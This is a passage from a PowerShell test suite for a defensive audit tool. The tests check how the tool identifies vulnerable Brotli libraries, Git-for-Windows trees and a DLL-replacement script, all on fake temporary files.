        Assert-Equal (Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' $case[0]) -Sha256 $bk[0].Sha256).Reason 'known-hash' "Brotli lib verdict: not a backup ($($case[1]))"
    }
    $uv=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' 'C:\x\libbrotlidec.dll' -Fv '1.1.0') -Sha256 ('0' * 64)
    Assert-Equal "$($uv.Verdict)|$($uv.Reason)|$($uv.GitRoot)" 'UNKNOWN|unknown-hash|' 'Brotli lib verdict: unknown hash is not guessed'
    Assert-Equal (Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' 'C:\x\libbrotlidec.dll') -Sha256 '').Reason 'hash-error' 'Brotli lib verdict: no hash'
    Assert-Equal (Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' 'C:\x\libbrotlidec.dll') -Sha256 $bk[0].Sha256 -ReadError 'locked').Verdict 'UNKNOWN' 'Brotli lib verdict: read error wins over a hash'
    $cv=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' 'C:\x\libbrotlidec.dll' 'True' -Note 'cloud-only, not read') -Sha256 $bk[0].Sha256
    Assert-Equal "$($cv.Verdict)|$($cv.Reason)" 'UNKNOWN|cloud-only' 'Brotli lib verdict: cloud-only is UNKNOWN even with a hash'
    $lv=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' 'C:\x\libbrotlidec.dll' -Note 'link, not read') -Sha256 $bk[0].Sha256
    Assert-Equal "$($lv.Verdict)|$($lv.Reason)" 'UNKNOWN|not-read' 'Brotli lib verdict: link is UNKNOWN'
    # CEF / Qt WebEngine: UNKNOWN with the version (CEF carries the Chromium version in ProductVersion); .NET: VULNERABLE with FileVersion.
    $cef=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'cef' 'C:\Steam\bin\cef\libcef.dll' -Fv '3.1.2' -Pv '109.1.18+gf1c41e4+chromium-109.0.5414.120')
    Assert-Equal "$($cef.Verdict)|$($cef.Version)|$($cef.Reason)" 'UNKNOWN|109.1.18+gf1c41e4+chromium-109.0.5414.120|chromium-embedded' 'CEF row verdict'
    $qt=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'qtwebengine' 'C:\x\Qt6WebEngineCore.dll' -Fv '6.7.2.0')
    Assert-Equal "$($qt.Verdict)|$($qt.Version)" 'UNKNOWN|6.7.2.0' 'Qt WebEngine row verdict'
    $dn=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'dotnet-native' 'C:\x\System.IO.Compression.Native.dll' -Fv '8.0.1024.46610' -Pv '8.0.10+abc' -Co 'Microsoft Corporation')
    Assert-Equal "$($dn.Verdict)|$($dn.Version)|$($dn.Reason)" 'VULNERABLE|8.0.1024.46610|dotnet-no-fix' '.NET self-contained row verdict'
    # Only a Microsoft-built DLL with a version is taken for the unfixed .NET; others are not assumed (v2.12).
    $dno=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'dotnet-native' 'C:\x\System.IO.Compression.Native.dll' -Fv '1.0.0.0' -Co 'Other Ltd')
    Assert-Equal "$($dno.Verdict)|$($dno.Reason)" 'UNKNOWN|dotnet-not-microsoft' '.NET native: another company is not assumed'
    $dnv=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'dotnet-native' 'C:\x\System.IO.Compression.Native.dll' -Co 'Microsoft Corporation')
    Assert-Equal "$($dnv.Verdict)|$($dnv.Reason)" 'UNKNOWN|not-read' '.NET native: no version read'
    $dnl=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'dotnet-native' 'C:\x\System.IO.Compression.Native.dll' -Fv '8.0.1.0' -Note 'link, not read' -Co 'Microsoft Corporation')
    Assert-Equal $dnl.Verdict 'UNKNOWN' '.NET native: a link is not judged'
    Assert-Equal (Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'other' 'C:\x\a.dll')).Verdict 'UNKNOWN' 'Brotli lib verdict: unexpected kind'
    # Git tree detection (a Git for Windows tree is recognized by git.exe, so the owner of a DLL can be named).
    $gt=Join-Path $temp 'gittrees'
    foreach ($d in @('full\cmd','full\mingw64\bin','full\mingw64\libexec\git-core','ucrt\cmd','ucrt\ucrt64\bin','ucrt\ucrt64\libexec\git-core',
                     'mini\mingw64\bin','mini\mingw64\libexec\git-core','x32\cmd','x32\mingw32\bin','root-bin\bin','root-bin\mingw64\bin',
                     'nogit\mingw64\bin','app\bin','app\mingw64\bin','odd\libexec\git-core')) { [void][IO.Directory]::CreateDirectory("$gt\$d") }
    foreach ($f in @('full\cmd\git.exe','ucrt\cmd\git.exe','mini\mingw64\bin\git.exe','x32\cmd\git.exe','root-bin\bin\git.exe')) { [IO.File]::WriteAllBytes("$gt\$f",[byte[]]@(0)) }
    $g=Get-AuditGitRootOfFile -Path "$gt\full\mingw64\bin\libbrotlidec.dll"
    Assert-Equal "$($g.Root)|$($g.Prefix)|$($g.Is32)" "$gt\full|mingw64|False" 'Git root: mingw64\bin with cmd\git.exe'
    $g=Get-AuditGitRootOfFile -Path "$gt\full\mingw64\libexec\git-core\libbrotlidec.dll"
    Assert-Equal "$($g.Root)|$($g.Prefix)" "$gt\full|mingw64" 'Git root: mingw64\libexec\git-core'
    $g=Get-AuditGitRootOfFile -Path "$gt\ucrt\ucrt64\libexec\git-core\libbrotlidec.dll"
    Assert-Equal "$($g.Root)|$($g.Prefix)" "$gt\ucrt|ucrt64" 'Git root: ucrt64\libexec\git-core'
    $g=Get-AuditGitRootOfFile -Path "$gt\mini\mingw64\bin\libbrotlidec.dll"
    Assert-Equal "$($g.Root)|$($g.Prefix)" "$gt\mini|mingw64" 'Git root: MinGit (only <prefix>\bin\git.exe)'
    $g=Get-AuditGitRootOfFile -Path "$gt\x32\mingw32\bin\libbrotlidec.dll"
    Assert-Equal "$($g.Root)|$($g.Prefix)|$($g.Is32)" "$gt\x32|mingw32|True" 'Git root: mingw32 is flagged 32-bit'
    $g=Get-AuditGitRootOfFile -Path "$gt\root-bin\mingw64\bin\libbrotlidec.dll"
    Assert-Equal "$($g.Root)" "$gt\root-bin" 'Git root: <root>\bin\git.exe'
    Assert-Equal ($null -eq (Get-AuditGitRootOfFile -Path "$gt\nogit\mingw64\bin\libbrotlidec.dll")) $true 'Git root: no git.exe means not a Git tree'
    Assert-Equal ($null -eq (Get-AuditGitRootOfFile -Path "$gt\app\bin\libbrotlidec.dll")) $true 'Git root: plain app\bin'
    Assert-Equal ($null -eq (Get-AuditGitRootOfFile -Path "$gt\app\mingw64\bin\libbrotlidec.dll")) $true 'Git root: mingw64 of a non-Git app'
    Assert-Equal ($null -eq (Get-AuditGitRootOfFile -Path "$gt\odd\libexec\git-core\libbrotlidec.dll")) $true 'Git root: libexec without a prefix folder'
    Assert-Equal ($null -eq (Get-AuditGitRootOfFile -Path "$gt\full\mingw64\libbrotlidec.dll")) $true 'Git root: not in bin or libexec\git-core'
    Assert-Equal ($null -eq (Get-AuditGitRootOfFile -Path 'C:\libbrotlidec.dll')) $true 'Git root: drive root'
    $uvg=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' "$gt\mini\mingw64\bin\libbrotlidec.dll") -Sha256 ('1' * 64)
    Assert-Equal "$($uvg.Verdict)|$($uvg.GitRoot)|$($uvg.GitPrefix)|$($uvg.GitIs32)" "UNKNOWN|$gt\mini|mingw64|False" 'Brotli lib verdict: unknown hash inside a Git tree names the Git root'
    $uv32=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' "$gt\x32\mingw32\bin\libbrotlidec.dll") -Sha256 ('1' * 64)
    Assert-Equal "$($uv32.GitRoot)|$($uv32.GitIs32)" "$gt\x32|True" 'Brotli lib verdict: 32-bit Git tree'
    $ng=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' "$gt\app\bin\libbrotlidec.dll") -Sha256 ('1' * 64)
    Assert-Equal "$($ng.Reason)|$($ng.GitRoot)" 'unknown-hash|' 'Brotli lib verdict: unknown hash outside Git has no Git root'
    # Row builder: metadata only; cloud-only is not opened.
    $rd=Join-Path $temp 'rows'; [void][IO.Directory]::CreateDirectory($rd)
    $dll=Join-Path $rd 'libbrotlidec-0a1b2c3d.dll'; [IO.File]::WriteAllBytes($dll,[byte[]]@(1,2,3))
    $rr=Get-AuditBrotliLibRow -Path $dll
    Assert-Equal "$($rr.Kind)|$($rr.Length)|$($rr.CloudOnly)|$($rr.Note)|$($rr.FileVersion)" 'brotli-lib|3|False||' 'Brotli lib row: plain file'
    (Get-Item -LiteralPath $dll).Attributes=[IO.FileAttributes]::Offline
    $rc=Get-AuditBrotliLibRow -Path $dll
    Assert-Equal "$($rc.CloudOnly)|$($rc.Note)|$($rc.FileVersion)" 'True|cloud-only, not read|' 'Brotli lib row: cloud-only is not read'
    (Get-Item -LiteralPath $dll).Attributes='Normal'
    $rm=Get-AuditBrotliLibRow -Path (Join-Path $rd 'absent\libcef.dll')
    Assert-Equal "$($rm.Kind)|$($rm.Note -like 'not read:*')" 'cef|True' 'Brotli lib row: unreadable file keeps a Note'
    $ne=Get-AuditNeighborExeText -Path (Join-Path $rd 'bin\libbrotlidec.dll')
    Assert-Equal $ne '' 'Neighbor exe text: empty when nothing is there'
    [IO.File]::WriteAllBytes((Join-Path $rd 'app.exe'),[byte[]]@(0))
    Assert-Equal (([string](Get-AuditNeighborExeText -Path $dll)).StartsWith("$rd\app.exe [")) $true 'Neighbor exe text: names an exe in the same folder'
    # 3.2 -> 6.4 contract, using the runbook's own code: the columns Import-AuditScan requires are written by 3.2,
    # and an old / partial file is reported as UNKNOWN instead of being used.
    $runbook=Join-Path $PSScriptRoot 'emudhra-runbook.md'
    if (Test-Path -LiteralPath $runbook) {
        $rbText=[IO.File]::ReadAllText($runbook,[Text.UTF8Encoding]::new($false))
        $imp=[regex]::Match($rbText,'(?s)(function Import-AuditScan\(.*?)\r?\n(?=\$probePy)').Groups[1].Value
        Assert-Equal ($imp.Length -gt 100) $true 'Runbook: Import-AuditScan found'
        $reqText=[regex]::Match($rbText,"Import-AuditScan 'brotli-lib-found\.csv' @\(([^)]*)\)").Groups[1].Value
        $req=@([regex]::Matches($reqText,"'([^']+)'") | ForEach-Object { $_.Groups[1].Value })
        Assert-Equal ($req.Count -ge 7) $true 'Runbook: 6.4 requires the brotli-lib-found.csv columns'
        $cols=@($rr.PSObject.Properties.Name)
        Assert-Equal (@($req | Where-Object { $cols -notcontains $_ }).Count) 0 'Runbook: required columns are all written by Get-AuditBrotliLibRow'
        foreach ($c in 'FullName','Kind','Length','LastWriteTime','FileVersion','ProductVersion','CompanyName','CloudOnly') { Assert-Equal ($cols -contains $c) $true "Brotli lib row column: $c" }
        Assert-Equal $rbText.Contains("'ca-file-found.csv','brotli-lib-found.csv','supply-chain-ioc.csv','venv-inventory.csv'") $true 'Runbook 3.2: previous-run diff list has brotli-lib-found.csv and supply-chain-ioc.csv'
        Assert-Equal $rbText.Contains("'ca-file-found.csv','brotli-lib-found.csv','supply-chain-ioc.csv') { if (Test-Path -LiteralPath") $true 'Runbook 3.2: old .ok markers of brotli-lib-found.csv / supply-chain-ioc.csv are cleared first'
        Assert-Equal ($rbText.Contains('Export-Csv "$out\supply-chain-ioc.csv"') -and $rbText.Contains('"$out\supply-chain-ioc.csv.ok"')) $true 'Runbook 3.2: supply-chain csv and .ok marker are written'
        Assert-Equal $rbText.Contains("Get-AuditIocFinding -Path `$c -Text `$text") $true 'Runbook 3.2: IOC candidates are judged by Get-AuditIocFinding'
        Assert-Equal $rbText.Contains('$skip = Get-AuditReadSkipReason -Item $fi') $true 'Runbook 3.2: IOC check reads local cloud files'
        Assert-Equal $rbText.Contains("foreach (`$n in 'brotli-lib-found.csv','supply-chain-ioc.csv') { if (Test-Path -LiteralPath `"`$out\`$n`") { Remove-Item") $true 'Runbook 3.2: old brotli / supply-chain csv removed before a run (an empty Export-Csv writes nothing)'
        Assert-Equal ($rbText.Contains('Export-Csv "$out\brotli-lib-found.csv"') -and $rbText.Contains('"$out\brotli-lib-found.csv.ok"')) $true 'Runbook 3.2: csv and .ok marker are written'
        $out=$temp; $vs=[Collections.Generic.List[object]]::new()
        function Add-VS($Topic,$Item,$Path,$Version,$Verdict,$Note) { $vs.Add([pscustomobject]@{ Topic=$Topic; Item=$Item; Verdict=$Verdict; Note=$Note }) }
        Invoke-Expression $imp
        $csv=Join-Path $temp 'brotli-lib-found.csv'
        Assert-Equal @(Import-AuditScan 'brotli-lib-found.csv' $req).Count 0 'Import: no .ok marker, no rows'
        Assert-Equal "$($vs.Count)|$($vs[0].Verdict)|$($vs[0].Item)" '1|UNKNOWN|brotli-lib-found.csv' 'Import: no .ok marker is reported as UNKNOWN'
        Write-AuditUtf8 -Path "$csv.ok" -Text "v2.12 test`n"
        $vs.Clear(); Assert-Equal @(Import-AuditScan 'brotli-lib-found.csv' $req).Count 0 'Import: marker without a csv is 0 rows'; Assert-Equal $vs.Count 0 'Import: marker without a csv adds nothing'
        '"FullName","Kind"' | Set-Content -LiteralPath $csv -Encoding UTF8
        $vs.Clear(); [void](Import-AuditScan 'brotli-lib-found.csv' $req)
        Assert-Equal ($vs.Count -ge 1 -and $vs[0].Verdict -eq 'UNKNOWN' -and $vs[0].Note -like '*CloudOnly*') $true 'Import: missing columns are reported as UNKNOWN'
        @($rr,$rc) | Export-Csv -LiteralPath $csv -NoTypeInformation -Encoding UTF8
        $vs.Clear(); $imported=@(Import-AuditScan 'brotli-lib-found.csv' $req)
        Assert-Equal "$($imported.Count)|$($vs.Count)|$($imported[1].CloudOnly)|$($imported[1].Kind)" '2|0|True|brotli-lib' 'Import: a csv written by Get-AuditBrotliLibRow is read back'
        Remove-Item -LiteralPath $csv,"$csv.ok" -Force
        Remove-Item Function:\Add-VS
        # The 3.2 walk (the runbook's own code from $prune to just before $cfgs) collects exactly the intended files on a fake tree.
        $walkCode=[regex]::Match($rbText,'(?s)(\$prune = @\(.*?)\r?\n(?=\$cfgs = foreach)').Groups[1].Value
        Assert-Equal ($walkCode -match 'function Find-WheelLibs' -and $walkCode -match 'function Find-EnvMarkers') $true 'Runbook 3.2: walk code extracted'
        Invoke-Expression $walkCode   # defines the walk's lists and functions in this scope (they use $script:)
        $w=Join-Path $temp 'walk'
        $tree=@('venvA\pyvenv.cfg','venvA\Lib\site-packages\pillow_jxl_plugin.libs\libbrotlidec-0a1b2c3d.dll','venvA\Lib\site-packages\numpy.libs\libopenblas.dll',
                'venvA\Lib\site-packages\pkg\libbrotlidec.dll','embed\site-packages\other.libs\brotlidec.dll','Inkscape\bin\libbrotlidec.dll','Steam\cef\libcef.dll',
                'Qt\Qt6WebEngineCore.dll','PowerToys\System.IO.Compression.Native.dll','dotnet\shared\Microsoft.NETCore.App\9.0.1\System.IO.Compression.Native.dll',
                'ImageMagick\CORE_RL_brotli_.dll','git\mingw64\libexec\git-core\libbrotlidec.dll','node_modules\x\libcef.dll','docs\libbrotlidec.txt')
        foreach ($t in $tree) { [void][IO.Directory]::CreateDirectory((Split-Path -Parent "$w\$t")); [IO.File]::WriteAllBytes("$w\$t",[byte[]]@(0)) }
        $walkOut=@(Find-EnvMarkers $w)
        $gotLibs=@($brotliLibFound | ForEach-Object { $_.Substring($w.Length + 1) } | Sort-Object)
        $wantLibs=@('embed\site-packages\other.libs\brotlidec.dll','git\mingw64\libexec\git-core\libbrotlidec.dll','ImageMagick\CORE_RL_brotli_.dll','Inkscape\bin\libbrotlidec.dll',
                    'PowerToys\System.IO.Compression.Native.dll','Qt\Qt6WebEngineCore.dll','Steam\cef\libcef.dll','venvA\Lib\site-packages\pillow_jxl_plugin.libs\libbrotlidec-0a1b2c3d.dll') | Sort-Object
        Assert-Equal ($gotLibs -join '|') ($wantLibs -join '|') 'Walk: Brotli libraries by name (wheel *.libs, not shared runtime, not node_modules)'
        Assert-Equal (@($walkOut).Count) 1 'Walk: still reports the venv (pyvenv.cfg)'
        $kinds=@($brotliLibFound | ForEach-Object { Get-AuditBrotliLibKind -Path $_ } | Sort-Object | Group-Object | ForEach-Object { "$($_.Name)=$($_.Count)" }) -join ','
        Assert-Equal $kinds 'brotli-lib=5,cef=1,dotnet-native=1,qtwebengine=1' 'Walk: kinds of the collected files'
        $kv=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' "$w\git\mingw64\libexec\git-core\libbrotlidec.dll") -Sha256 $bk[2].Sha256
        Assert-Equal "$($kv.Verdict)|$($kv.Reason)|$($kv.GitRoot)" 'VULNERABLE|known-hash|' 'Brotli lib verdict: known hash outside a Git tree has no Git root'
        $kv2=Get-AuditBrotliLibVerdict -Row (New-BrotliRow 'brotli-lib' "$gt\full\mingw64\bin\libbrotlidec.dll") -Sha256 $bk[2].Sha256
        Assert-Equal "$($kv2.Verdict)|$($kv2.GitRoot)" "VULNERABLE|$gt\full" 'Brotli lib verdict: known VULNERABLE hash inside a Git tree names the Git root'
    }
    # Replace-GitBrotli.ps1 on MinGit-style trees (no bin\curl.exe): fake roots with placeholder DLLs, nothing is replaced.
    if (Test-Path -LiteralPath $replaceScript) {
        function New-FakeGitRoot($Name,$Prefixes) {
            $root="$temp\$Name"
            foreach ($p in $Prefixes) {
                [void][IO.Directory]::CreateDirectory("$root\$p\bin")
                foreach ($n in 'libbrotlicommon.dll','libbrotlidec.dll','libbrotlienc.dll') { [IO.File]::WriteAllBytes("$root\$p\bin\$n",[byte[]]@(9,9,9)) }
            }
            $root
        }
        $fMini=New-FakeGitRoot 'fake-mini' @('mingw64'); $fUcrt=New-FakeGitRoot 'fake-ucrt' @('ucrt64')
        $fBoth=New-FakeGitRoot 'fake-both' @('mingw64','ucrt64'); $fX32=New-FakeGitRoot 'fake-x32' @('mingw32'); $fNone=Join-Path $temp 'fake-none'
        [void][IO.Directory]::CreateDirectory($fNone)
        $fakeHash=(Get-FileHash -LiteralPath "$fMini\mingw64\bin\libbrotlidec.dll").Hash.ToLower()
        function Get-ErrorText([scriptblock]$Code) { try { & $Code; '' } catch { $_.Exception.Message } }
        & {
            . $replaceScript
            Assert-Equal (Resolve-GitBrotliPrefix $fMini) 'mingw64' 'Replace-GitBrotli: MinGit mingw64 (no curl.exe) is accepted'
            Assert-Equal (Resolve-GitBrotliPrefix $fUcrt) 'ucrt64' 'Replace-GitBrotli: MinGit ucrt64 (no curl.exe) is accepted'
            Assert-Equal ((Get-ErrorText { Resolve-GitBrotliPrefix $fBoth }) -like '*both mingw64 and ucrt64*') $true 'Replace-GitBrotli: both layouts stop'
            Assert-Equal ((Get-ErrorText { Resolve-GitBrotliPrefix $fX32 }) -like '*32-bit*nothing is replaced*') $true 'Replace-GitBrotli: mingw32 only stops with a clear message'
            Assert-Equal ((Get-ErrorText { Resolve-GitBrotliPrefix $fNone }) -like '*found none*') $true 'Replace-GitBrotli: no layout stops'
            # without curl.exe the version comes from the known libbrotlidec.dll hash; an unknown build is not guessed
            Assert-Equal ((Get-ErrorText { Get-ShippedBrotli "$fMini\mingw64\bin" 'mingw64' }) -like '*cannot be told*') $true 'Replace-GitBrotli: unknown DLL without curl.exe stops'
            $shippedDec['mingw64'][$fakeHash]='1.2.0'
            $sb=Get-ShippedBrotli "$fMini\mingw64\bin" 'mingw64'
            Assert-Equal "$($sb.Version)|$($sb.Source)" '1.2.0|hash' 'Replace-GitBrotli: known shipped hash gives the version without curl.exe'
            Assert-Equal ((Get-ErrorText { Get-ShippedBrotli "$fUcrt\ucrt64\bin" 'ucrt64' }) -like '*cannot be told*') $true 'Replace-GitBrotli: a hash known for the other layout does not count'
            Assert-Equal ($null -eq (Get-GitExe $fMini 'mingw64')) $true 'Replace-GitBrotli: no git.exe in the fake MinGit'
            [IO.File]::WriteAllBytes("$fMini\mingw64\bin\git.exe",[byte[]]@(0))
            Assert-Equal (Get-GitExe $fMini 'mingw64') "$fMini\mingw64\bin\git.exe" 'Replace-GitBrotli: MinGit git.exe is found in <prefix>\bin'
            Remove-Item -LiteralPath "$fMini\mingw64\bin\git.exe"
            # Elevated runs are limited to Program Files trees that only admins can change (v2.12: TOCTOU).
            # The temp tree is the user's own: it has non-admin modifiers and is not under Program Files.
            Assert-Equal (@(Get-NonAdminModifiers $fMini).Count -gt 0) $true 'Replace-GitBrotli: a user folder has non-admin modifiers'
            Assert-Equal ((Get-ErrorText { Assert-SafeElevatedTree $fMini @("$fMini\mingw64\bin") }) -like '*not under Program Files*normal (not elevated) PowerShell*') $true 'Replace-GitBrotli: elevated run refuses a user folder'
            Assert-Equal ((Test-IsElevated) -is [bool]) $true 'Replace-GitBrotli: elevation test returns a bool'
        }
        # the whole script with -Check: it gets past the layout test (the old message named bin\curl.exe) and stops at the unknown DLL
        $psExe=(Get-Process -Id $PID).Path
        function Invoke-ReplaceCheck($Root) { Invoke-AuditNativeProcess -FilePath $psExe -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$replaceScript,'-GitRoot',$Root,'-Check','-LogFile',"$temp\replace-check.log") -TimeoutMs 120000 }
        $rc1=Invoke-ReplaceCheck $fMini
        Assert-Equal ($rc1.ExitCode -ne 0 -and ($rc1.StdErr + $rc1.StdOut) -like '*cannot be told*' -and ($rc1.StdErr + $rc1.StdOut) -notlike '*bin\curl.exe*') $true 'Replace-GitBrotli -Check: MinGit tree is recognized and an unknown DLL stops'
        $rc2=Invoke-ReplaceCheck $fX32
        Assert-Equal ($rc2.ExitCode -ne 0 -and ($rc2.StdErr + $rc2.StdOut) -like '*32-bit*') $true 'Replace-GitBrotli -Check: 32-bit Git stops'
        Assert-Equal (@(Get-ChildItem -LiteralPath $fMini -Directory -Filter '_emudhra_backup*').Count) 0 'Replace-GitBrotli -Check: nothing created'
        Assert-Equal ((Get-FileHash -LiteralPath "$fMini\mingw64\bin\libbrotlidec.dll").Hash.ToLower()) $fakeHash 'Replace-GitBrotli -Check: DLL unchanged'
    }
    # Regression: py.exe 3.13 rejected a quoted "--list-paths". Only when a launcher exists; it reads the registry only.
    $pyl=Get-Command py.exe -CommandType Application -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($pyl) {
        $pr=Invoke-AuditNativeProcess -FilePath $pyl.Source -ArgumentList @('--list-paths') -TimeoutMs 30000
        Assert-Equal (($pr.StdErr + $pr.StdOut) -match 'unknown option') $false 'py --list-paths is recognized as a launcher option'
    }
    if ($PythonPath) {
        # Round trip through a real CRT program: every argument arrives unchanged.
        $argv=Join-Path $temp 'argv.py'
        Write-AuditUtf8 -Path $argv -Text 'import json,sys;sys.stdout.write(json.dumps(sys.argv[1:]))'
        $trip=@('--list-paths','',':all:','a b','C:\x y\','C:\a\b\','a"b','a\"b',"a`tb",($unicode + ' x'))
        $back=@((Invoke-AuditNativeProcess -FilePath $PythonPath -ArgumentList (@($argv) + $trip) -Encoding ([Text.UTF8Encoding]::new($false)) -Environment @{ PYTHONIOENCODING='utf-8' }).StdOut | ConvertFrom-Json | ForEach-Object { $_ })
        Assert-Equal $back.Count $trip.Count 'Native argument round trip: count'
        for ($k=0; $k -lt $trip.Count; $k++) { Assert-Equal $back[$k] $trip[$k] "Native argument round trip: [$($trip[$k])]" }
        $fake=Join-Path $temp ($unicode + ' fake probe.py')
        Write-AuditUtf8 -Path $fake -Text @'
import json,sys
print(json.dumps([dict(route=r,verdict='ACCEPT',detail=sys.argv[1]) for r in ['stdlib-ssl','certifi','requests']]))
'@
        $output=@(Invoke-AuditPythonProcess -Python $PythonPath -ProbeScript $fake -Url 'https://example.test/')
        Assert-Equal $output.Count 3 'Native process Unicode and space path'
        Assert-Equal $output[0].detail 'https://example.test/' 'Argument retained'
        $sleep=Join-Path $temp 'sleep.py'
        Write-AuditUtf8 -Path $sleep -Text 'import time;time.sleep(30)'
        $didTimeout=$false
        try { Invoke-AuditPythonProcess -Python $PythonPath -ProbeScript $sleep -Url 'https://example.test/' -TimeoutMs 1000 }
        catch { $didTimeout=$_.Exception.Message -like '*timeout*' }
        Assert-Equal $didTimeout $true 'Child timeout enforced'
        # Long stderr must come back unwrapped (PowerShell 5.1 wraps "2>&1" ErrorRecords at console width).
        $noisy=Join-Path $temp 'noisy.py'
        Write-AuditUtf8 -Path $noisy -Text "import sys;sys.stderr.write('x'*300+' CRYPT_E_REVOKED (0x80092010)');sys.exit(35)"
        $native=Invoke-AuditNativeProcess -FilePath $PythonPath -ArgumentList @($noisy)
        Assert-Equal $native.ExitCode 35 'Native exit code'
        # -WorkingDirectory: the child runs there (MSYS curl writes "-o NUL" as a file in the inherited folder).
        $cwdpy=Join-Path $temp 'cwd.py'; Write-AuditUtf8 -Path $cwdpy -Text 'import os;print(os.getcwd())'
        $wd=Join-Path $temp 'wd'; [void][IO.Directory]::CreateDirectory($wd)
        Assert-Equal (Invoke-AuditNativeProcess -FilePath $PythonPath -ArgumentList @($cwdpy) -WorkingDirectory $wd -Encoding ([Text.UTF8Encoding]::new($false)) -Environment @{ PYTHONIOENCODING='utf-8' }).StdOut.Trim() $wd 'Native working directory'
        # -Environment: a value sets the variable, $null removes an inherited one (uv is measured with the saved UV_NATIVE_TLS).
        $envpy=Join-Path $temp 'envpy.py'
        Write-AuditUtf8 -Path $envpy -Text "import os;print(repr(os.environ.get('EMUDHRA_TEST_VAR')))"
        $env:EMUDHRA_TEST_VAR='inherited'
        try {
            Assert-Equal (Invoke-AuditNativeProcess -FilePath $PythonPath -ArgumentList @($envpy) -Environment @{ EMUDHRA_TEST_VAR='1' }).StdOut.Trim() "'1'" 'Environment: set'
            Assert-Equal (Invoke-AuditNativeProcess -FilePath $PythonPath -ArgumentList @($envpy) -Environment @{ EMUDHRA_TEST_VAR=$null }).StdOut.Trim() 'None' 'Environment: $null removes'
            Assert-Equal (Invoke-AuditNativeProcess -FilePath $PythonPath -ArgumentList @($envpy)).StdOut.Trim() "'inherited'" 'Environment: inherited by default'
        } finally { Remove-Item Env:EMUDHRA_TEST_VAR -ErrorAction SilentlyContinue }
        # A grandchild that keeps the inherited pipes open must not hang the caller past the deadline.
        $holder=Join-Path $temp 'holder.py'
        Write-AuditUtf8 -Path $holder -Text "import subprocess,sys;subprocess.Popen([sys.executable,'-c','import time;time.sleep(20)'],stdout=sys.stdout,stderr=sys.stderr);print('parent done')"
        $sw=[Diagnostics.Stopwatch]::StartNew(); $pipeTimeout=$false
        try { [void](Invoke-AuditNativeProcess -FilePath $PythonPath -ArgumentList @($holder) -TimeoutMs 3000) }
        catch { $pipeTimeout=$_.Exception.Message -like '*timeout*' }
        Assert-Equal ($pipeTimeout -and $sw.ElapsedMilliseconds -lt 15000) $true 'Inherited pipe cannot outlive the deadline'
        Assert-Equal ($native.StdErr -match 'x{300} CRYPT_E_REVOKED \(0x80092010\)') $true 'Native stderr unwrapped'
        $absent=Join-Path $temp 'absent-python.exe'
        $missing=Invoke-AuditPythonSet -PythonPaths @($absent) -ProbeScript $fake
        Assert-Equal @($missing.Summary).Count 3 'Missing interpreter produces all route rows'
        Assert-Equal @($missing.Summary | Where-Object Status -ne 'UNKNOWN').Count 0 'Missing interpreter never FIXED'
    }
} finally { Remove-Item -LiteralPath $temp -Recurse -Force }
Write-Output "PASS: $script:passed assertions; no external network probes."
